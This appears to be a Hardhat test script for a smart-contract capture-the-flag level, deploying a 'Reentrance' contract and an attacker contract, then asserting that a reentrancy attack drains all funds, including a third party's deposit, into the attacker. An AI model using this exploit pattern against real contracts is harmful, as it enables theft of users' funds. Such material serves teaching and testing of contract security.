const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Reentrance", async () => {

    it("should steal", async function () {
        [owner, attacker, third] = await ethers.getSigners();

        const Reentrance = await ethers.getContractFactory("Reentrance");
        const contract = await Reentrance.deploy();
        await contract.deployed();

        const ReentranceHack = await ethers.getContractFactory("ReentranceHack");
        const hack = await ReentranceHack.connect(attacker).deploy(contract.address);
        await hack.deployed();

        await contract.connect(attacker).donate(hack.address, {value: "100"});
        await contract.donate(third.address, {value: "9900"});
        expect(await contract.balanceOf(hack.address)).to.equal("100");

        await hack.withdraw();

        expect(await ethers.provider.getBalance(hack.address)).to.equal("10000");
        expect(await ethers.provider.getBalance(contract.address)).to.equal("0");
    });

});